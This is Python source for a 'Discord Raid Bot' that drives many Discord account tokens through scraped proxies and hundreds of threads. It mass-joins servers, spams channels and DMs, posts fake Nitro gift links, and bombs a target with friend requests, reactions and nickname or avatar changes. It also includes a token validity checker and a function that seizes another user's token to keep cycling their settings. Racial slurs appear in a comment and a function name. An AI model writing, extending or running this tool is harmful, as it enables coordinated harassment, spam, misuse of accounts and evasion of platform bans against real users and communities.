import requests, os, time, json, random, threading, sys, re, colorama, queue, string, base64
from multiprocessing import Process
from colorama import Fore, init, Back, Style
from itertools import cycle
init(convert=True)
workingproxies = 0
badproxies = 0
checkedproxies = 0
workingproxylist = []
reacts = 0
reqsent = 0
imagelist = []
def main():
    proxies_q = queue.Queue()
    tokens_q = queue.Queue()
    timestring = ""

    def joiner():

        def worker():
            while not tokens_q.empty():
                thrjoiner(invitelink)

        def thrjoiner(inv):

            tok = tokens_q.get()
            tokens_q.task_done()

            def hardjoin():

                thisproxy = random.choice(proxies)
                req = requests.session()

                try:
                    r = req.post(f'https://discord.com/api/v8/invites/{inv}', headers={'Authorization': tok}, proxies=thisproxy, timeout=5)
                    # r = req.post(f'https://discord.com/api/v8/invite/{inv}', headers={'Authorization': tok})
                    if r.status_code == 200:
                        tokensjoined.append(tok)

                        print("Successfully Joined Token -> ", tok)
                        os.system(
                            f"title Discord Raid Bot  [Tokens Joined: {totaljoined}] ")

                    elif r.status_code == 401 or r.status_code == 404 or r.status_code == 403 or r.status_code == 402 or r.status_code == 204:
                        unauthorizedtokens.append(tok)
                        print("Token Banned -> ", tok,"  code: ",r.status_code)
    
                except:
                    hardjoin()
            hardjoin()

            # while True:
            # 	thisproxy = random.choice(proxies)

            # 	try:

            # 		r = req.post(f'https://discord.com/api/v6/invite/{inv}', headers = {'Authorization': tok},proxies = thisproxy, timeout=5)
            # 		if r.status_code == 200:
            # 			tokensjoined.append(tok)
            # 			totaljoined+=1
            # 			print("Successfully Joined Token -> ",tok)
            # 			os.system(f"title Discord Raid Bot  [Tokens Joined: {totaljoined}] ")
            # 			break
            # 		elif r.status_code == 401 or r.status_code == 404 or r.status_code == 403 or r.status_code == 402 or r.status_code == 204:
            # 			unauthorizedtokens.append(tok)
            # 			print("Token Banned-> ",tok)
            # 			break
            # 		didjoined = 1
            # 		break
            # 	except:
            # 		print("Unable to Join Token-> ",tok)

        for tok in tokens:
            tokens_q.put(tok)
        tx = []

        for t in range(500):
            mt = threading.Thread(target=worker)
            mt.start()
            tx.append(mt)
        for t in tx:
            t.join()
        print(" [Done] Tokens Joined : ", totaljoined)

    # 	tokensaccounted = 0
    # 	inv = invitelink
    # 	while tokensaccounted < len(tokens):
    # 		for tok in tokens:
    # 			if tok not in tokensjoined or unauthorizedtokens:
    # 				if delayforinvite == 0:
    # 					if proxycount != 0:
    # 						thisproxy = random.choice(proxies)
    # 						try:

    # 							r = req.post(f'https://discord.com/api/v6/invite/{inv}', headers = {'Authorization': tok},proxies = thisproxy, timeout=5)
    # 							if r.status_code == 200:
    # 								tokensjoined.append(tok)
    # 								totaljoined+=1
    # 								print("Successfully Joined Token -> ",tok)
    # 								os.system(f"title Discord Raid Bot  [Tokens Joined: {totaljoined}] ")
    # 							elif r.status_code == 401:
    # 								unauthorizedtokens.append(tok)
    # 								print("Token Banned-> ",tok)
    # 						except:
    # 							print("Unable to Join Token-> ",tok)
    # 					else:
    # 						try:
    # 							r = req.post(f'https://discord.com/api/v6/invite/{inv}', headers = {'Authorization': tok})
    # 							if r.status_code == 200:
    # 								tokensjoined.append(tok)
    # 								totaljoined+=1
    # 								print("Successfully Joined Token -> ",tok)
    # 								os.system(f"title Discord Raid Bot  [Tokens Joined: {totaljoined}] ")
    # 							elif r.status_code == 401:
    # 								unauthorizedtokens.append(tok)
    # 								print("Token Banned-> ",tok)
    # 						except:
    # 							print("Unable to Join Token-> ",tok,"Proxy Used ->",proxy)

    # 				else:
    # 					if proxycount != 0:
    # 						try:
    # 							proxy = random.choice(proxies)
    # 							r = req.post(f'https://discord.com/api/v6/invite/{inv}', headers = {'Authorization': tok}, proxies = proxy,timeout=5)
    # 							if r.status_code == 200:
    # 								tokensjoined.append(tok)
    # 								totaljoined+=1
    # 								print("Successfully Joined Token -> ",tok)
    # 							elif r.status_code == 401:
    # 								unauthorizedtokens.append(tok)
    # 								print("Token Banned-> ",tok)
    # 						except:
    # 							print("Unable to Join Token-> ",tok)
    # 					else:
    # 						try:
    # 							r = req.post(f'https://discord.com/api/v6/invite/{inv}', headers = {'Authorization': tok})
    # 							if r.status_code == 200:
    # 								tokensjoined.append(tok)
    # 								totaljoined+=1
    # 								print("Successfully Joined Token -> ",tok)
    # 								os.system(f"title Discord Raid Bot  [Tokens Joined: {totaljoined}] ")
    # 							elif r.status_code == 401:
    # 								unauthorizedtokens.append(tok)
    # 								print("Token Banned-> ",tok)
    # 						except:
    # 							print("Unable to Join Token-> ",tok)
    # 					time.sleep(delayforinvite)
    # 			else:
    # 				pass
    # 		tokensaccounted = len(tokensjoined)+len(unauthorizedtokens)
    # 	uselessvar = 1
    # 	print("Joined!\n Total Tokens Joined: ",totaljoined)

    def sendmessage():

        while True:
            tok = random.choice(tokens)
            thisproxy = random.choice(proxies)
            # if bypass:
            #messagetosend = messagetosend + str(random.randint(10,100))
            msg = messagetosend + str(random.randint(111,999))
            if appendascii == 1:

                asc = ''
                for _ in range(int(lentosend)):
                    num = random.randrange(13000)
                    asc = asc + chr(num)
                msg = messagetosend + asc
            
                           
            # ms = messagetosend + str((random.randint(1000,9999)))
            try:
                r = req.post(f'https://discordapp.com/api/v6/channels/{channelid}/messages', headers={
                             'Authorization': tok}, json={'content': msg, 'nonce': '', 'tts': False}, proxies=thisproxy, timeout=10)
                if r.status_code == 200:
                    # messagessent+=1
                    print("Sent ->  ", tok)
                elif r.status_code == 401:
                    print("Token unauthorized ->  ", tok)
                elif r.status_code == 403:
                    print("Token unauthorized ->  ", tok)
            except:
                pass
    def massmentioner():
        req = requests.session()
        
        while True:
            tok = random.choice(tokens)
            thisproxy = random.choice(proxies)
            for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                payload = {"content": m, "tts": False}
                while True:
                    try:
                        req.post(f"https://canary.discordapp.com/api/v6/channels/{channelid}/messages", headers={"authorization":tok}, json=payload, proxies=thisproxy, timeout=5)
                    except:
                        massmentioner()

    def imagespammer():
        while True:
            req = requests.session()
            tok = random.choice(tokens)
            thisproxy = random.choice(proxies)
            file = random.choice(os.listdir(folder))
            img = f"{folder}/{file}"
            files = {"file": open(img, 'rb')}
            # if text.lower() == "ascii":
            #     files['payload_json'] = (None, json.dumps({'content': asciigen(1999)}))
            # else:
            #     files['payload_json'] = (None, json.dumps({'content': text}))
            
            try:
                src = req.post(f"https://canary.discordapp.com/api/v6/channels/{channelid}/messages", headers={"authorization":tok}, files=files, proxies=thisproxy, timeout=10)
                if src.status_code == 204:
                    print("[IMAGE SENT] => ",tok)
            except:
                pass

    def nitrospam():
        while True:
            tok = random.choice(tokens)
            thisproxy = random.choice(proxies)
            # if bypass:
            #messagetosend = messagetosend + str(random.randint(10,100))
            

            lol = ''.join(random.choices(
                string.ascii_uppercase + string.digits + string.ascii_lowercase, k=16))
            messagetosend = "discord.gift/" + lol
            # if nitroascii == 1:
                # lentosend = 1999 - len(messagetosend)
                # asc = ''
                # for _ in range(int(lentosend)):
                #     num = random.randrange(13000)
                #     asc = asc + chr(num)
                # messagetosend = messagetosend + " "  + asc
                # messagetosend = " NIGGER NITRO SNIPERS " + messagetosend

            # ms = messagetosend + str((random.randint(1000,9999)))
            try:

                r = req.post(f'https://discordapp.com/api/v6/channels/{channelidtospam}/messages', headers={
                             'Authorization': tok}, json={'content': messagetosend, 'nonce': '', 'tts': False}, proxies=thisproxy, timeout=5)
                if r.status_code == 200:

                    print("Sent ->  ", tok)

            except:
                pass

    def tokenchecker():
        with tokens_q.mutex:
            tokens_q.queue.clear()
        for tok in tokens:
            tok = tok.strip()
            tokens_q.put(tok)
        def worker():
            while not tokens_q.empty():
                checkertok()    
        def checkertok():
            tok = tokens_q.get()
            tokens_q.task_done()
            
            def dowork():
                
                req = requests.session()
                
                try:
                    thisproxy = random.choice(proxies)
                    r = req.get('https://canary.discordapp.com/api/v6/users/@me', headers={'Authorization': tok}, proxies=thisproxy, timeout=5)

                    if r.status_code == 401:
                        NonWorkingtokens.append(tok)
                        print("Invalid Token ->  ", tok)
                    elif r.status_code == 403:
                        phonelocked.append(tok)
                        print("Phone Locked Token ->  ", tok)
                    else:
                        response = json.loads(r.content.decode())
                        if response["verified"]:
                            if response["phone"] is not None:
                                print(f"[VERIFIED (E & P)]: {tok}")
                            else:
                                print(f"[VERIFIED (E)]: {tok}")
                            workingtokens.append(tok)
                        else:
                            if response["phone"] is not None:
                                print(f"[VERIFIED (P)]: {tok}")
                                workingtokens.append(tok)
                            else:
                                print(f"[UNVERIFIED]: {tok}")
                                unverifiedtokens.append(tok)    
                      
                      
                except:
                    dowork()
            dowork()    
        tx = []
            
        for t in range(500):
            mt = threading.Thread(target=worker)
            mt.start()
            tx.append(mt)
        for t in tx:
            t.join()
        f= open('WorkingTokens.txt','a')
        for t in workingtokens:
            f.write(t+"\n")
        f.close()    
        input("    Tokens Working: " + str(len(workingtokens)) + "\n" "   Tokens Unauthorized: " + str(len(NonWorkingtokens)) + "\n   Tokens Phone LOCKED: " + str(len(phonelocked))  + "\n   Tokens Email LOCKED: " + str(len(unverifiedtokens) ))
        wanttosave = int(input(" Do you wanat to save results?\n 1.YES  2.NO :"))
        if wanttosave == 1:
            filename = input("Enter the file name to save: ")
            f = open(filename,"w")
            f.write("=========== Working ===========\n")
            for line in workingtokens:
                f.write(line + "\n")
            f.write("=========== Phone Locked ===========\n")    
            for line in phonelocked:
                f.write(line + "\n")
            f.write("=========== Email Locked ===========\n")    
            for line in unverifiedtokens:
                f.write(line + "\n")
            f.write("=========== Unauthorized ===========\n")    
            for line in NonWorkingtokens:
                f.write(line + "\n")    
            f.close()            


    # def serverleaver():
    #     tokenincount = 0
    #     while tokenincount < len(tokens):
    #         for tok in tokens:
    #             if tok not in leftservertokens or Lockedtokens or NonWorkingtokens:
    #                 headers = {
    #                     'Authorization': tok, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
    #                 try:
    #                     thisproxy = random.choice(proxies)
    #                     r = req.delete(
    #                         f"https://canary.discordapp.com/api/v6/users/@me/guilds/{serveridtoleave}", headers=headers, proxies=thisproxy, timeout=1)
    #                     if r.status_code == 200:
    #                         leftservertokens.append(tok)
    #                         print("Token Working ->  ", tok)
    #                     elif r.status_code == 401:
    #                         NonWorkingtokens.append(tok)
    #                         print("Unauthorized Token->  ", tok)
    #                     elif r.status_code == 403:
    #                         Lockedtokens.append(tok)
    #                         print("Locked Token ->  ", tok)
    #                 except:
    #                     print
    #                 tokenincount = len(leftservertokens) + \
    #                     len(Lockedtokens) + len(NonWorkingtokens)
    #     input("Tokens Working: " + str(len(workingtokens)) + "   Tokens Unauthorized: " +
    #           str(len(NonWorkingtokens)) + "   Tokens LOCKED: " + str(len(Lockedtokens)))

    def typer():

        while True:
            proxyt = random.choice(proxies)

            tok = random.choice(tokens)
            try:
                r = requests.post('https://discord.com/api/v8/channels/%s/typing' % (
                    channelidtotype), headers={'Authorization': tok}, proxies=proxyt, timeout=2)

                if r.status_code == 204:  # Successflly Typing
                    print("SuccessFULL request sent  TOKEN =>  ", tok)
                    pass
                elif r.status_code == 401:
                    print('Invalid Token')
                    print(r.text)

                elif "Invalid Form Body" in r.text:  # Invalid Channel ID
                    print('Invalid Channel ID')
                    print(r.text)

                elif "You are being rate limited." in r.text:
                    print(r.text)
                    pass
                else:  # Debugging
                    print(r.text)

            except:
                pass
                # print("Unable to send Request")

    def proxyscrapper():
        uselesslist = list()
        usefulllist = list()
        copylist = list()
        print("\tScrapping Proxies...")
        urls = ['https://hidester.com/proxydata/php/data.php?mykey=data&offset=0&limit=10000&orderBy=latest_check&sortOrder=DESC&country=&port=&type=undefined&anonymity=undefined&ping=undefined&gproxy=2', 'https://free-proxy-list.net/', 'https://proxy-daily.com/',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt', 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt', 'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt', 'https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json']
        timestr = "Proxy-List-" + time.strftime("%Y-%m-%d  %H-%M-%S")+".txt"

        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
            "scheme": "https",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin"
        }
        headers1 = {

            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
            "authority": "hidester.com",
            "path": "/proxydata/php/data.php?mykey=data&offset=0&limit=50&orderBy=latest_check&sortOrder=DESC&country=&port=&type=15&anonymity=7&ping=7&gproxy=2",
            "scheme": "https",
            "accept": "application/json, text/plain, */*",
            # "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            # "cookie: __cfduid=d3cac3468e56af6666cc1cbec86b2b3601602661224; PAPVisitorId=Bl3xobtL5y56BGM8x2sSReXpfBc3VZCL; _pk_ref.2.cb00=%5B%22%22%2C%22%22%2C1602661232%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.2.cb00=*; __atssc=google%3B2; __atuvc=10%7C42; __atuvs=5f86ab6d8205a9dd009; _pk_id.2.cb00=2aac21f61de9067b.1602661232.1.1602663432.1602661232.
            "referer": "https://hidester.com/proxylist/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin"
        }
        for url in urls:
            if url == "https://free-proxy-list.net/":
                r = requests.get(url, headers=headers)
                regex = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{2,5}"
                matchlist = re.findall(regex, r.text)

                with open(timestr, 'a') as proxyfile:
                    lolol = 0
                    for match in matchlist:
                        if lolol < len(matchlist):
                            proxyfile.write(match+"\n")
                            lolol += 1
                        else:
                            proxyfile.write(match)
                            lolol += 1
                print("\tScrapping from another site...")
            if url == "https://hidester.com/proxydata/php/data.php?mykey=data&offset=0&limit=10000&orderBy=latest_check&sortOrder=DESC&country=&port=&type=undefined&anonymity=undefined&ping=undefined&gproxy=2":
                r = requests.post(url, headers=headers1)
                data = r.json()
                with open(timestr, 'a') as proxyfile:
                    for x in range(len(data)):
                        proxyleft = data[x]['IP']
                        portright = data[x]['PORT']
                        proxytoadd = str(proxyleft) + ":" + str(portright)
                        if x < len(data):
                            proxyfile.write(proxytoadd + "\n")
                        else:
                            proxyfile.write(proxytoadd)
            elif url == "https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json":
                r = requests.get(url)
                data = r.json()

                with open(timestr, 'a') as proxyfile:
                    for x in range(len(data['proxies'])):
                        proxyleft = data['proxies'][x]['ip']
                        portright = data['proxies'][x]['port']
                        proxytoadd = str(proxyleft) + ":" + str(portright)
                        proxyfile.write(proxytoadd + "\n")

            else:
                r = requests.get(url, headers=headers)
                regex = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{2,5}"
                matchlist = re.findall(regex, r.text)

                with open(timestr, 'a') as proxyfile:
                    lolol = 0
                    for match in matchlist:
                        if lolol < len(matchlist):
                            proxyfile.write(match+"\n")
                            lolol += 1
                        else:
                            proxyfile.write(match)
                            lolol += 1
        print("\tScrapping Done...\n\tRemoving Duplicates...")
        with open(timestr, 'r') as xyzlol:
            for line in xyzlol:
                usefulllist.append(line)
        with open(timestr, 'w') as xqclol:
            for line in usefulllist:
                if line not in uselesslist:
                    xqclol.write(line)
                    uselesslist.append(line)
                else:
                    copylist.append(line)

        input("Done!")

    # def asciigen(length):
    #     asc = ''
    #     for _ in range(int(length)):
    #         num = random.randrange(13000)
    #         asc = asc + chr(num)
    #     return asc

    def arrtoQ(proxies, q):
        for _ in proxies:
            q.put(_)
        return q

    def saveproxies(proxy):
        try:

            output = open(timestring, 'a')
            output.write(proxy+"\n")
            # output.write(":".join(
            # 	[proxy]
            # 	)+"\n")
            output.close()
        except Exception as e:
            print(e)

    def removedup():
        trashlist = []
        fileName = input("Enter the file name to work on \n >> ")
        lol = open(fileName, 'r').readlines()
        for l in lol:
            if l not in trashlist:
                trashlist.append(l)
        f = open(fileName, 'w')
        for l in trashlist:
            f.write(l)
        f.close()

    def tokenseziure():
        token = input(" Enter the token to fuck with\n >> ")
        headers = {'Authorization': token}
        print(
            f" [{Fore.YELLOW}CRASHER{Fore.RESET}] Crasher is now running. Restart the tool to stop it.")
        modes = cycle(["light", "dark"])
        while True:
            setting = {'theme': next(modes), 'locale': random.choice(
                ['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch(
                "https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)

    def react():
        
        with tokens_q.mutex:
            tokens_q.queue.clear()

        channelid = input(" Enter the channel ID\n >> ")
        messageid = input(" Enter the message ID\n >> ")
        emojiid =  input(" Enter the emoji ID (lookslike >>  KOOL:606097542652100609  )")
        urltoreact = f"https://discord.com/api/v8/channels/{channelid}/messages/{messageid}/reactions/{emojiid}/@me"
        for tok in tokenlist:
            tokkk = tok.strip()
            tokens_q.put(tokkk)
        
        def worker():
            while not tokens_q.empty():
                reacterm()

        def reacterm():
            token = tokens_q.get()
            tokens_q.task_done()
            
            def reactor():
                global reacts
                proxy = random.choice(proxies)
                req = requests.Session()
                try:
                    r = req.put(urltoreact, headers = {"authorization":token},proxies = proxy,timeout = 2)
                    if r.status_code == 204:
                        reacts+=1
                        os.system(f"title Discord Raid Bot  [Tokens Loaded: {tokencount}] [Proxies Loaded: {proxycount}] [Reactions: {reacts}]")
                        print(Fore.GREEN + " [SENT] -> ",token + Fore.RESET)
                        
                except:
                    reactor()
            reactor()        
        tx = []
            
        for t in range(500):
            mt = threading.Thread(target=worker)
            mt.start()
            tx.append(mt)
        for t in tx:
            t.join()
        print("Done") 

    def friendbomber():
        
        with tokens_q.mutex:
            tokens_q.queue.clear()
        for tok in tokens:
            tok = tok.strip()
            tokens_q.put(tok)
        def worker():
            
            while not tokens_q.empty():
                work()
        def work():
            tok = tokens_q.get()
            headers = {
                'Authorization': tok,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US',
                'content-length': '2',
                'origin':'https://discord.com',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'referer': 'https://discord.com/channels/764409169720639498/765161756896788492'
            }
            # headers = {'authorization': tok,'content-length': '2','content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'}
            
            
            def act(): 
                    #  https://discord.com/api/v8/users/@me/relationships/277850755178954752
                    #    user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
                global reqsent
                
                url = f'https://discord.com/api/v8/user/@me/relationships/{userid}'
                # url = f'https://canary.discordapp.com/api/v8/users/@me/relationships/{userid}'
                # print("User id: ",userid)
                try:
                    proxyt = random.choice(proxies)
                    req = requests.session()
                    # print(proxyt)
                    # r = req.put(url, headers=headers, proxies = proxyt,timeout=5)
                    user = userid.split("#")
                    payload = {"username": user[0], "discriminator": user[1]}
                    r = req.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,json=payload, proxies=proxyt, timeout=10)
                    # print(r,r.text)
                    if r.status_code == 204:
                        print( " [Sent] =>  ",tok)
                        reqsent+=1
                    elif r.status_code == 403 or 401:
                        print(" [BANNED] =>  ",tok)    
                except:
                    act()          

            act()

        tx = []
        for t in range(500):
            mt = threading.Thread(target=worker)
            mt.start()
            tx.append(mt)
        for t in tx:
            t.join()
        print(" Done!\n Requests Sent :",reqsent)

    def deletefriendbomber():
        
        with tokens_q.mutex:
            tokens_q.queue.clear()
        for tok in tokens:
            tok = tok.strip()
            tokens_q.put(tok)
        def worker():
            
            while not tokens_q.empty():
                work()
        def work():
            tok = tokens_q.get()
            headers = {
                'Authorization': tok,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US',
                'content-length': '2',
                'origin':'https://discord.com',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'referer': 'https://discord.com/channels/764409169720639498/765161756896788492'
            }
            # headers = {'authorization': tok,'content-length': '2','content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'}
            
            
            def act(): 
                    #  https://discord.com/api/v8/users/@me/relationships/277850755178954752
                    #    user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
                global reqsent
                
                url = f'https://discord.com/api/v8/user/@me/relationships/{userid}'
                # url = f'https://canary.discordapp.com/api/v8/users/@me/relationships/{userid}'
                # print("User id: ",userid)
                try:
                    proxyt = random.choice(proxies)
                    req = requests.session()
                    # print(proxyt)
                    # r = req.put(url, headers=headers, proxies = proxyt,timeout=5)
                    user = userid.split("#")
                    payload = {"username": user[0], "discriminator": user[1]}
                    r = req.delete('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,json=payload, proxies=proxyt, timeout=10)
                    # print(r,r.text)
                    if r.status_code == 204:
                        print( " [Sent] =>  ",tok)
                        reqsent+=1
                except:
                    act()          

            act()

        tx = []
        for t in range(500):
            mt = threading.Thread(target=worker)
            mt.start()
            tx.append(mt)
        for t in tx:
            t.join()
        print(" Done!\n Requests Cancelled :",reqsent)                       
        
    def leaver():
        with tokens_q.mutex:
            tokens_q.queue.clear()
        for tok in tokens:
            tok = tok.strip()
            tokens_q.put(tok)

        def worker():
            while not tokens_q.empty():
                workup()

        def workup():
            req = requests.session()
            tok = tokens_q.get()
            headers = {'Authorization': tok, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            def worknigger():
                proxyt = random.choice(proxies)
                try:
                    r = req.delete(f"https://discord.com/api/v8/users/@me/guilds/{serverid}", headers=headers, proxies=proxyt, timeout=5)
                    if r.status_code == 200:
                        print(Fore.GREEN + "[LEFT] -> " + tok + Fore.RESET)
                    else:
                        print("[ERROR] -> ",tok)    
                except:
                    worknigger()                    
            worknigger()
        tx = []
        for t in range(500):
            mt = threading.Thread(target=worker)
            mt.start()
            tx.append(mt)
        for t in tx:
            t.join()
        print("Done!")  

    def nnchanger():
        with tokens_q.mutex:
            tokens_q.queue.clear()
        for tok in tokens:
            tok = tok.strip()
            tokens_q.put(tok)
        nnickname =  str(input("Enter the nickname you want: (Max 32 Chars) (1 for Invisible | 2 for Random Ascii) ")) 
        def worker():
            while not tokens_q.empty():
                work()
        def work():
            tok = tokens_q.get()
            headers = {
                'Authorization': tok,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36'
            }
           
            
            def act(): 
                url = f'https://discord.com/api/v8/guilds/{nnserverid}/members/@me/nick'
                # url = f'https://canary.discordapp.com/api/v6/guilds/{nnserverid}/members/@me/nick'
               
                try:
                    proxyt = random.choice(proxies)
                    req = requests.session()
                    
                
                    mypayload = {'nick':nnickname}
                    if(nnickname) == "1":
                        mypayload = {'nick':"󠇰󠇰󠇰󠇰"}
                    elif(nnickname) == "2":
                        asc = ''
                        for _ in range(int(32)):
                            num = random.randrange(13000)
                            asc = asc + chr(num)
                        mypayload = {'nick':asc}    
                    r = req.patch(url, headers=headers, json=mypayload, proxies=proxyt, timeout=10)
                    print(r.status_code)
                
                    if r.status_code == 200:
                        print( " [CHANGED] =>  ",tok)
                    else:
                        print(r.status_code,r.text)    
                       
                except:
                    act()          

            act()

        tx = []
        for t in range(500):
            mt = threading.Thread(target=worker)
            mt.start()
            tx.append(mt)
        for t in tx:
            t.join()
        print(" Done!\n ")
                    
    def pfpchanger():
        with tokens_q.mutex:
            tokens_q.queue.clear()
        for tok in tokens:
            tok = tok.strip()
            tokens_q.put(tok)
        # avatarfile =
        global imagelist
        print("Please beaware that images are randomly chosen from 'pics' folder !")
        def worker():
            while not tokens_q.empty():
                work()
        def work():
            tok = tokens_q.get()
            headers = {
                'Authorization': tok,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
            }
            
            
            def act(): 
                
                print(threading.active_count())
                url = f'https://discord.com/api/v8/users/@me'
                # url = f'https://canary.discordapp.com/api/v6/guilds/{nnserverid}/members/@me/nick'
               
                try:
                    proxyt = random.choice(proxies)
                    req = requests.session()
                    
                    mypayload = random.choice(imagelist)

                    src = req.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, proxies=proxyt, timeout=10)
                    response = json.loads(src.content.decode())
                    username = response['username']
                    email = response['email']

                    mypayload = {
                        'avatar': random.choice(imagelist),
                        'email': email,
                        'password': '',
                        'username': username
                    }
                    r = req.patch(url, headers=headers, json=mypayload, proxies=proxyt, timeout=10)
                    print(r.status_code)
                
                    if r.status_code == 200:
                        print( " [CHANGED] =>  ",tok)
                    else:
                        print(r.status_code,r.text)    
                       
                except Exception as e:
                    print("Found Error: ",e)
                    print(threading.active_count())
                    act()          

            act()

        tx = []
        for t in range(500):
            mt = threading.Thread(target=worker)
            mt.start()
            tx.append(mt)
        for t in tx:
            t.join()
        print(" Done!\n ")

    def dmspammer():
        with tokens_q.mutex:
            tokens_q.queue.clear()
        for tok in tokens:
            tok = tok.strip()
            tokens_q.put(tok)
        def worker():
            
            while not tokens_q.empty():
                work()
        def work():
            tok = tokens_q.get()
            headers = {
                'Authorization': tok,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US',
                'content-length': '2',
                'origin':'https://discord.com',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'referer': 'https://discord.com/channels/764409169720639498/765161756896788492'
            }
           
            
            def act(): 
                   
                global reqsent
                
                url = f'https://discord.com/api/v8/user/@me/relationships/{userid}'
               
                try:
                    proxyt = random.choice(proxies)
                    req = requests.session()
                    tok = random.choice(tokens)
                    payload = {'recipient_id': userid}
                    r = req.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers={'authorization':tok}, json=payload, proxies=proxyt, timeout=10)
                    dm_json = json.loads(r.content)
                    while True:
                        try:
                            r = req.post(f"https://canary.discordapp.com/api/v6/channels/{dm_json['id']}/messages", headers=headers, json=payload, proxies=proxyt, timeout=10)
                        except:
                            act()
                    if r.status_code == 200:
                        print( " [Sent] =>  ",tok)
                       
                except:
                    act()          

            act()

        tx = []
        for t in range(500):
            mt = threading.Thread(target=worker)
            mt.start()
            tx.append(mt)
        for t in tx:
            t.join()
        print(" Done!\n ") 
    
    def checker():
        staticproxies = proxies_q.qsize()
        proxy = proxies_q.get()
        proxies_q.task_done()
        req = requests.session()
        global checkedproxies, workingproxies, badproxies
        checkedproxies += 1
        try:
            proxies = {
                'http': 'http://' + proxy,
                'https': 'https://' + proxy
            }
            response = req.post(sitetocheck, proxies=proxies, timeout=TIMEOUT)
            if response.status_code == 200:
                saveproxies(proxy)

                print(Style.BRIGHT + Fore.YELLOW +
                      " [GOOD] " + proxy + Fore.RESET + Style.RESET_ALL, flush=True)
                workingproxylist.append(proxy)
                workingproxies += 1
                os.system(
                    f"title Full-Force    Checked {checkedproxies}    Working {workingproxies}   Bad {badproxies}    Total {staticproxies}")
            else:
                print(" Bad response code: ",response.status_code)        

        except:
            badproxies += 1
            #print(Style.DIM + Fore.RED + " [BAD] "+ proxy + Fore.RESET + Style.RESET_ALL,flush=True)

    def worker():
        while not proxies_q.empty():
            checker()

    os.system('cls')
    os.system(f"title Discord Raid Bot [Full_Force^]")
    print(Fore.RED + fr"""
					______     _ _       ______                         
					|  ___|   | | |      |  ___|      
					| |_ _   _| | |      | |_ ___  _ __ ___ ___ 
		{Fore.RESET + Fore.BLUE}			|  _| | | | | |IIIIII|  _/ _ \| '__/ __/ _ |
		{Fore.RESET + Fore.YELLOW}			| | | |_| | | |      | || (_) | | | (_|  __/
		{Fore.RESET + Fore.CYAN}			\_|  \__,_|_|_|      \_| \___/|_|  \___\___|""" + Fore.RESET
          )
    req = requests.Session()
    with open("config.json", 'r') as conf:
        config = json.load(conf)
    tokenfile = config['tokenfile']
    tokencount = 0
    proxycount = 0
    workingtokens = list()
    NonWorkingtokens = list()
    tokensjoined = list()
    unauthorizedtokens = list()
    tokenlist = []
